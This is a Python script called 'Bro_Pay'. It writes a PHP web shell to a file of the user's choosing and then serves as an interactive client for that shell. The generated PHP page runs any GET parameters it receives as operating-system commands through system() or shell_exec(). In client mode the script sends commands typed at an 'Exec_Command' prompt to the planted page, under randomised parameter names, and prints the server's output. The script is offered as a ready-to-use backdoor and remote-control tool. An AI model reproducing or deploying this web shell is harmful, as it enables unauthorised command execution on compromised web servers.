import urllib.request
import urllib.error
import random
import sys
import os
import platform

_platform = str(platform.platform())
def _help():
	if "Windows" in _platform:
		os.system("color 2")
	print("""
			      ____                           _____                    
			     |  _ \\                         |  __ \\                 
			     | |_) |  _ __    ___           | |__) |   __ _   _   _  
			     |  _ <  | '__|  / _ \\          |  ___/   / _` | | | | | 
			     | |_) | | |    | (_) |         | |      | (_| | | |_| | 
			     |____/  |_|     \\___/          |_|       \\__,_| \\__,  | 
		                                 ______                       __/ /                            
			                        |______|                     |___/                             
		|----------------------------------------------------------------------------|                
			Useg:
				Bro_Pay.py [Options]
		|----------------------------------------------------------------------------| 
			Options:
				-p || -P || --payload ->   Payload Name
				-u || -U || --url     ->   Url Payload For Connect
		|----------------------------------------------------------------------------|
			EX:
				Bro_Pay.py -p bro_pay || Bro_Payload.py -p bro_pay.php
				Bro_Pay.py -u http://localhost/bro_pay.php
		|----------------------------------------------------------------------------|
		""")
	try:
		_exit = input("Pres Any Key To Exit:># ")
		if "Windows" in _platform:
			os.system("color B")
			os.system("color 4")
			os.system("color 7")
			os.system("cls")
	except EOFError:
		try:
			if "Windows" in _platform:
				os.system("color B")
				os.system("color 4")
				os.system("cls")
		except KeyboardInterrupt:
			if "Windows" in _platform:
				os.system("color 7")
				os.system("cls")
_sys = sys.argv
if len(_sys) <= 2 or sys.argv[1] == "-h" or sys.argv[1] == "-H" or sys.argv[1] == "--help":
	_help()
elif len(_sys) >= 3:
	frist_arge = sys.argv[1]
	secnd_arge = sys.argv[2]
	def File_Create(secnd_arge,extention=''):
		with open(secnd_arge+extention,"w") as f:
			f.write('''
			<?php
				$ar = array();
				if(isset($_GET) and ! empty($_GET)){
					foreach($_GET as $command){
						array_push($ar,$command);
					}
					if(in_array("netstat",$ar)){
						echo (@(system(($ar[0])." ".$ar[1]." ".$ar[2]." ".$ar[3])." ".$ar[4]." ".$ar[5]." ".$ar[6]." ".$ar[7]." "));
					}else{
						echo (@(shell_exec(($ar[0])." ".$ar[1]." ".$ar[2]." ".$ar[3])." ".$ar[4]." ".$ar[5]." ".$ar[6]." ".$ar[7]." "));
					}
				}else{
					echo "<h3>"."Plz Enter [GET] Var"."<h3>";
				}
			?>
                   ''')
	if "-p" in frist_arge or "-P" in frist_arge or "--payload" in frist_arge:
		if ".php" in secnd_arge:
			print("			     [+] Sucsess Create [ "+secnd_arge+" ]")
			File_Create(secnd_arge)
		elif ".php" not in secnd_arge:
			print("			     [+] Sucsess Create [ "+secnd_arge+".php ]")
			File_Create(secnd_arge,".php") 
	elif "-u" in frist_arge or "-U" in frist_arge or "--url" in frist_arge:
		letters = "abcdefghijklmnopqrstuywzxv"
		rad_letters = random.sample(letters,k=len(letters))
		url = secnd_arge
		if "Windows" in _platform:
			os.system("color B")
		while True:
			user_data = input("Exec_Command># ")
			if user_data == "exit" or user_data == "Exit" or user_data == "EXIT":
				if "Windows" in _platform:
					os.system("color 7")
					os.system("cls")
				break
			ar_data = user_data.split()
			Result = url+"/?"
			for i in ar_data:
				if ar_data.index(i) == (len(ar_data)-1):
					Result += rad_letters[random.randrange(0,9)]+rad_letters[random.randrange(0,9)]+rad_letters[random.randrange(0,9)]+rad_letters[random.randrange(0,9)]+"="+i
				else:
					Result += rad_letters[random.randrange(0,9)]+rad_letters[random.randrange(0,9)]+rad_letters[random.randrange(0,9)]+rad_letters[random.randrange(0,9)]+"="+i+"&"
			try:
				open_url = urllib.request.urlopen(Result)
				content = str(open_url.read().decode('utf-8')).rstrip("\n")
				print("|---------------------------------------------------------------------------|")
				if len(content) == 37:
					print("			     [+] Sucsess Opreation")
				else:
					print(content)
				print("|---------------------------------------------------------------------------|")
			except urllib.error.URLError as UE:
				print("			     [-] Invalid URL: "+url)
				print("			    ",UE)
			except urllib.error.HTTPError as HPE:
				print("			     [-] HTTP Error")
				print("			    ",HPE)
	else:
		print("			    			 [-] Invalid Args")
		_help()
